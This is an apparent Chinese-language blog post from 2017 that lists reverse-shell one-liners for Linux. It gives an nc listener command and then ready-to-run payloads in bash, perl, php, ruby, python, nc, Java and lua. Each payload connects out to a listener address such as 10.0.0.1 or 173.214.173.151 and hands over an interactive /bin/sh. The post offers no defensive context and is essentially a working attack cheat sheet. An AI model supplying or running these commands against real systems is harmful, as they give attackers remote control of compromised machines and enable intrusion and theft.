---
title: Linux下NC反弹shell命令
categories:
  - SYSTEM
date: 2017-11-08 19:15:30
tags:
---



本机开启监听：

```
nc -lvnp 4444
nc -vvlp 4444
```

目标机器开启反弹
bash版本：

```shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```


perl版本：

```shell
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


php版本：

```shell
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```


ruby版本：

```shell
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


python版本：

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


nc版本：

```shell
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
```


java版本：

```shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```


lua版本：

```shell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```


NC版本不使用-e参数：

```shell
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc x.x.x.x 4444 1>/tmp/backpipe
/bin/bash -i > /dev/tcp/173.214.173.151/8080 0<&1 2>&1

mknod backpipe p && telnet 173.214.173.151 8080 0backpipe
```


